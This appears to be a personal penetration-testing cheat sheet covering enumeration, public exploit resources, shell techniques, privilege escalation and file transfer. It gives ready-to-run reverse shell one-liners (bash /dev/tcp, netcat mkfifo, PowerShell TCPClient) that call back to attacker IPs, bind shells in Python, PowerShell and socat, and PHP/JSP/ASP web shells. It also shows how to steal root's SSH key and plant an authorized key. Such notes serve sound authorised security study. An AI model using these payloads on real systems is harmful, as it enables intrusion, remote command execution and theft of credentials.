---
Primary_category: "[[PENTESTING]]"
title: "MISCELLANEOUS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[PENTESTING]]

> [!CAUTION]- Notice
>
> **Be aware that this note is created to store all documentation which has not yet been assigned to a specific note or topic within the [[PENTESTING|Pentesting]] section**

#### Penetration Testing Process


![](https://academy.hackthebox.com/storage/modules/90/0-PT-Process.png)

---

#### Resources

##### Vulnerabilities Disclosure


| **Resource**| |
| --- | --- |
| ***CVEDetails*** | **[See here](https://www.cvedetails.com/)** |
| ***ExploitDB*** | **[See here](https://www.exploit-db.com/)** |
| ***Vulners*** | **[See here](https://vulners.com/)** |
| ***Packet Storm Security*** | **[See here](https://packetstormsecurity.com/)** |
| ***NIST*** | **[See here](https://nvd.nist.gov/vuln/search?execution=e2s1)** |

##### Ports and Services

###### Common Ports Cheatsheet

**[REFERENCE I](https://www.stationx.net/common-ports-cheat-sheet/)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[REFERENCE II](https://web.archive.org/web/20240315102711/https://packetlife.net/media/library/23/common-ports.pdf)**

###### Ports ↔ Services

***[All Ports and Services](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)***

######  Nmap - Ports List

> ***[Reference](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/)***

- **Top 1000 Ports**

```bash
nmap -sT --top-ports 1000 -v -oG - # TCP
nmap -sU --top-ports 1000 -v -oG - # UDP
```

- **Ports ordered by frequency**

```bash
sort -r -k3 /usr/share/nmap/nmap-services
```

- **Specific Service**

```bash
nmap -sT -p*telnet* -v -oG -
```

##### Netcat

Windows alternative to `netcat` → ***[Powercat](https://github.com/besimorhino/powercat)***

##### Service Scanning

###### *Banner Grabbling*

```bash
netcat -nv <IP_ADDRESS> <PORT>
telnet <IP_ADDRESS> <PORT>
```

###### *Nmap*

- ***Initial Scan***

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET> -oG allPorts
```

- ***Comprehensive Scan***

```bash
nmap -pPORTS -sCV <TARGET> -oN FullScan
```

###### *445 - SBM*

- ***Shared Resources Enumeration (NULL Session)***

```bash
smbclient -N -L //TARGET # Short
smbclient --no-pass -L //TARGET # Long
```

- ***Connection to a SMB Share through (User Authentication)***

```bash
smbclient -U 'DOMAIN\USER' 'PASSWORD' //TARGET/RESOURCE
```

###### *161/162 - SNMP*

- ***Download MIBS to OIDs translation***

```bash
sudo apt install -y -- snmp-mibs-downloader && download-mibs
```

This line must be commented in order to load all the available *MIBS*  →

```bash title="/etc/snmp/snmp.conf"
mibs :
```

- ***Get SNMP Version (v1 - v2c - v3)***

```bash
nmap --script "snmp* and not snmp-brute" <TARGET>
```

- ***Community String Bruteforce - OneSixtyOne***

> ***[Reference](https://github.com/trailofbits/onesixtyone)***

```bash
onesixtyone -c /path/to/wordlist <IP_ADDRESS>
```

> [!IMPORTANT]- *Dictionaries*
>
> ```bash
> /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
> ```
>

- ***Retrieve OIDs and their values from SNMP Agent***

```bash
snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <IP_ADDRESS>
snmpbulkwalk -v <SNMP_VERSION> -c <COMM_STRING> <IP_ADDRESS> .
snmp-check <IP_ADDRESS> -p <PORT> -c <COMM_STRING>
```

- ***SNMP Extended Query***

```bash
snmpwalk -v <SNMP_VERSION> -c <COMM_STRING> <IP_ADDRESS> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

##### 80/443 - Web enumeration

###### *Gobuster*

> ***[Reference](https://github.com/OJ/gobuster)***

- ***Directory/File Bruteforce***

```bash
gobuster dir -t 200 -w /path/to/wordlist -u https://domain.com
```

###### *Wfuzz*

> ***[Reference](https://github.com/xmendez/wfuzz)***

- ***Directory/File Bruteforce***

```bash
fuzz -c --hc 404 -t 20 -w /path/to/wordlist https://domain.com/FUZZ
```

###### *Curl*

- ***Banner/Headers Grabbling***

```bash
curl -sLI https://domain.com # Short
curl --silent --request GET --location --head https://domain.com # Long
```

- ***Robots.txt***

```bash
curl --silent --request GET --location https://domain.com/robots.txt
```

###### *Whatweb*

```bash
whatweb https://domain.com
whatweb --verbose https://domain.com # Verbose Mode
```

###### *Source Code*

- ***Source Code Review → `C-u`***

##### DNS Enumeration

###### *Gobuster*

- ***DNS Enumeration***

```bash
gobuster dns -d domain.com -w /path/to/wordlist
```

##### Public Exploits

###### Web Resources

***Online Exploit Databases →***

- ***[EXPLOIT DB](https://www.exploit-db.com/)***

- ***[RAPID 7](https://www.rapid7.com/db/)***

- ***[VULNERABILITY LAB](https://www.vulnerability-lab.com/)***

###### *Searchsploit*

```bash
sudo apt install -y -- exploitdb
```

##### Type of Shells

> ***[Reference I](https://github.com/trailofbits/onesixtyone)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[Reference II](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)***

###### *Reverse Shell*

The *Compromised Target* connects to the *Attacker Host* through a *listening port*

Therefore, stablish a *listen port* in the *Target* as follows →

***Netcat***

```bash title="Attacker"
nc -nlvp 443 # Linux
rlwrap -cN -H 1000 nc -nlvp 443 # Windows
```

***Bash `/dev/tcp`→***

```bash title="Linux Target"
bash -c "bash -i &> /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1"
```

***Netcat Traditional***

```bash title="Linux Target"
nc -e /bin/bash <IP_ADDRESS> <PORT>
```

***Netcat OpenBSD***

```bash title="Linux Target"
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f|/bin/sh -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
```

***Powershell***

> ***[Reference](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#fully-interactive-reverse-shell-on-windows)***

```powershell title="Windows Target"
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Then, connect to that *listen port* from the *Attacker Machine* →

```bash
nc <IP_ADDRESS> <PORT>
```

###### *Bind Shell*

> ***[Reference](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)***

The *Attacker Host* connects to a *listening port* in the *Target*

- ***Netcat Traditional***

```bash title="Target"
nc -nlvp -e /bin/bash
```

- ***Netcat OpenBSD***

```bash title="Target"
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 51337 >/tmp/f
```

- ***Socat***

***[Static Binaries](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)***

```bash title="Attacker"
socat FILE:`tty`,raw,echo=0 TCP:<TARGET>:<PORT>
```

```bash title="Target"
socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

- ***Python***

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

- ***Powershell***

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

###### *Web Shell*

Communication through a **Web Server** to *RCE*

It accepts the *System Commands* via *HTTP Parameters (GET/POST)*, executes them and prints back its output on the web page

- ***PHP***

```php
<?php system($_GET['cmd']); ?> // or $_REQUEST
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>" ;
```

- ***JSP***

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

- ***ASP***

```asp
<% eval request("cmd") %>
```

This web shell has to be uploaded to the Web Server in order to execute it

**Webroots for Common Web Servers →**

| **Web Server** | **Default Webrot** |
| --- | --- |
| ***Apache*** | **`/var/www/html/`** |
| ***Nginx*** | **`/usr/local/nginx/html/`** |
| ***IIS*** | **`C:\inetpub\wwwroot\`** |
| ***XAMPP*** | **`C:\xampp\htdocs\`** \

##### Upgrading to Fully Interactive *TTY/PTY*

> ***[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat)***

Once a connection is stablished *from/to the Target*, It is recommended to upgrade the *Basic/Limited Shell* obtained into a *Fully Interactive TTY*

- ***Script***

```bash title="Target"
script /dev/null -c bash # Spawn a Bash within a PTY ~ Pseudoterminal
C-z # SIGTSTP to background the previous Bash Process
```

- ***Python/stty***

```python
python -c 'import pty ; pty.spawn("/bin/bash")' # Spawn a Bash within a PTY
```

Once a *PTY* i.e. a *Pseudoterminal* is generated, just proceed to upgrade it as follows →

```bash title="Attacker"
stty raw -echo # Disable Terminal Input Processing and disable input's echo
fg # Foregrounds the Shell send to the background
reset xterm # Restore the Term to its default value while maintaining some Raw behaviour
```

```bash title="Target"
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows <NUMBER> columns <NUMBER>
. /etc/skel/.bashrc
```

##### Privilege Escalation

###### Checklist

***Hacktricks***

> ***[Linux](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[Windows](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)***

***PayloadAllTheThings***

> ***[Linux](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[Windows](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)***

###### Enumeration Scripts

***[PEASS](https://github.com/peass-ng/PEASS-ng)***

###### Kernel Exploitation

To check the *Kernel Version* in the Target System →

```bash
uname -r
```


###### Vulnerable Software

Check all installed software. It may has *vulnerable/unpatched* versions

- ***Linux***

```bash
dpkg -l
```

- ***Windows → `C:\Program Files` and `C:\Program Files (x86)`***

###### User Privileges

- ***Sudo → Check sudo Privileges for the current user***

```bash title="Linux Target"
sudo -l
```

- ***SUID Binaries***

> ***[GTFOBins](https://gtfobins.github.io/)***

```bash title="Linux Target"
find / -perm 4000 -type f 2> /dev/null
find / -user root -perm 4000 -type f 2> /dev/null # Only Root as EUID
```

> ***[LOLBAS](https://lolbas-project.github.io/#) - Windows Applications related to PE***

###### Cron Jobs ~ Sheduled Tasks

***Check Write Permissions over These directories***

- **`/etc/crontab`**
<br>
- **`/etc/cron.d`**
<br>
- **`/var/spool/cron/crontabs/root`**

###### SSH Keys

***Check Read/Write Permissions over the `.ssh` Directory***

- ***Read Perms → Copy the `id_rsa` content and login with that Private key via SSH***

```bash title="Target"
cat /root/.ssh/id_rsa
```

```bash title="Attacker"
nvim ./id_rsa_target
chmod 600 !$
ssh -p<PORT> -i !$ ssh <USER>@<TARGET>
```

- ***Write Perms → Create locally a key pair via `ssh-keygen` and add the Public Key into the `~/.ssh/authorized_keys`. Then, login with the Private Key via SSH***

```bash title="Attacker"
ssh-keygen -b 4096 -t rsa -f ./key
cat !$.pub # Copy the Key.pub Content
```

```bash title="Target"
nvim ~/.ssh/authorized_keys # Add the Key.pub Content within it
```

```bash title="Attacker"
ssh -p<PORT> -i ./key <USER>@<TARGET>
```


##### File Transfer

###### *Simple HTTP Server*

> ***[Reference](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server)***

First, build a simple *HTTP Server* in the *Attacker Host*

- ***Node.js***

```bash title="Attacker"
npx http-server /path/to/project -o -p 1234
```

- ***Python***

```bash title="Attacker"
python3 -m http.server 1234
```

- ***PHP***

```bash title="Attacker"
php -S localhost:1234
```

Then, according to the *Target OS*, process a *HTTP Request* to that Server from the *Target*

```bash title="Target"
wget http://<IP_ADDRESS>:<PORT>/path/to/resource
wget -O CUSTOM_NAME http://<IP_ADDRESS>:<PORT>/path/to/resource
curl --silent --remote-name http://<IP_ADDRESS>:<PORT>/path/to/resource
curl --silent --output CUSTOM_NAME http://<IP_ADDRESS>:<PORT>/path/to/resource
```

###### *SCP/SFTP*

If *SSH* access to the target is available, proceed as follows →

- ***SCP***

```bash title="Attacker"
scp -P<PORT> /path/to/local/resource <USER>@<TARGET>:/destination/path
```

- ***SFTP***

```bash title="Attacker"
sftp -P<PORT> <USER>@<TARGET>
```

```bash title="Target"
cd /destination/path # Remote Path
put /path/to/local/resource
exit
```

###### *Base64*

> ***[Man Page](https://linux.die.net/man/1/base64)***

Encode the file content to *Base64*

```bash title="Attacker"
base64 -w 0 /path/to/local/resource
```

Decode the *Base64* string

```bash
base64 -d <<< "BASE64_STRING" > /destination/path
```

###### File Transfer Validation

Check *File Type* transferred

```bash
file <FILE>
```

Check *File Integrity*

> *Run this command on both the Attacker and the Target Hosts*

```bash
md5sum <FILE>
sha256sum <FILE>
sha512sum <FILE>
```

##### PHP Disable Functions Enumeration

> ***[Reference](https://github.com/teambi0s/dfunc-bypasser/tree/master)***

> [!NOTE]- *Check Dangerous Functions*
>
> ```php
> <?php
> function getEnabledFunctions () {
>     
>     $commandFunctions = [
>         'pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled',
>         'pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler',
>         'pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait',
>         'pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec',
>         'popen','proc_open','passthru','link','symlink','syslog','ld','mail'
>     ];
> 
>     $disabledFunctions = array_map('trim', explode(',', ini_get('disable_functions')));
>     $enabledFunctions = array_diff($commandFunctions, $disabledFunctions);
> 
>     if (!empty($enabledFunctions)) {
>         foreach ($enabledFunctions as $function) {
>             echo "Function enabled ->" . $function . "<br>";
>         }
>     }
> }
>
> getEnabledFunctions();
> ?>
> ```
